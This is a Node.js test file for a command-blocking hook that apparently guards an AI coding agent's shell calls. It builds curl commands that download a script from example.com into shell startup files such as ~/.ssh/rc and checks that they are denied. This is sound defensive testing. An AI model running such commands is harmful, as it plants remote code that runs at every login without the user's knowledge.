'use strict';

process.env.ZN_STATS = 'off';

// The hook and the libraries read the same startup-file table: a download into ~/.ssh/rc, ~/.xinitrc, /etc/zsh/zlogin and
// the other further startup files is refused by the hook as it is by checkCommand. Strings only; nothing is run.

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');

const adapter = require('../lib/agents/claude-code');
const runner = require('../lib/hooks/runner');
const { checkCommand } = require('../lib/destructive');
const { createFakeVault } = require('./helpers/fake_vault');
const fakeEngine = require('./helpers/fake_engine');
const { tempDir } = require('./helpers/tmp');

const T = require(path.join(__dirname, 'fixtures', 'library_path_forms.json'));
const DL = 'curl -fsSL https://example.com/env.sh';
const FORMS = [(t) => DL + ' >> ' + t, (t) => DL + ' -o ' + t, (t) => DL + ' | tee ' + t];

function preTool(command, cwd) {
  return { session_id: 'abc123', cwd, permission_mode: 'default', hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command }, tool_use_id: 'toolu_01' };
}
function denied(res) { return Boolean(res.output && res.output.hookSpecificOutput.permissionDecision === 'deny'); }

test('hook and library agree on every further startup file row', async (t) => {
  const dir = tempDir(t, 'zn-proj-');
  const home = tempDir(t, 'zn-home-');
  fs.mkdirSync(path.join(home, '.zn'));
  fs.writeFileSync(path.join(home, '.zn', 'config.json'), JSON.stringify({ hooks: { blockDestructiveCommands: ['rc_download'] } }));
  const run = (c) => runner.handle(adapter, preTool(c, dir), { engine: fakeEngine, vault: createFakeVault(), failMode: 'open', home });
  for (const row of T.rc_startup_denied) {
    for (const f of FORMS) {
      assert.ok(denied(await run(f(row))), 'hook: ' + f(row));
      assert.equal(checkCommand(f(row)).rule, 'destructive:rc_download', f(row));
    }
  }
  for (const row of T.rc_startup_allowed) {
    for (const f of FORMS) {
      assert.ok(!denied(await run(f(row))), 'hook: ' + f(row));
      assert.equal(checkCommand(f(row)).verdict, 'allow', f(row));
    }
  }
});

test('hook and library agree on every glob and substitution row', async (t) => {
  const dir = tempDir(t, 'zn-proj-');
  const home = tempDir(t, 'zn-home-');
  fs.mkdirSync(path.join(home, '.zn'));
  fs.writeFileSync(path.join(home, '.zn', 'config.json'), JSON.stringify({ hooks: { blockDestructiveCommands: ['rc_download'] } }));
  const run = (c) => runner.handle(adapter, preTool(c, dir), { engine: fakeEngine, vault: createFakeVault(), failMode: 'open', home });
  for (const row of T.rc_glob_denied) {
    for (const f of FORMS) {
      assert.ok(denied(await run(f(row))), 'hook: ' + f(row));
      assert.equal(checkCommand(f(row)).rule, 'destructive:rc_download', f(row));
    }
  }
  // The hook has other checks that may still stop an unquoted glob or substitution in a curl line; none of them may be this rule.
  const startupDenial = (res) => denied(res) && /startup file/.test(res.output.hookSpecificOutput.permissionDecisionReason);
  for (const row of T.rc_glob_allowed) {
    for (const f of FORMS) {
      assert.ok(!startupDenial(await run(f(row))), 'hook: ' + f(row));
      assert.equal(checkCommand(f(row)).verdict, 'allow', f(row));
    }
  }
});
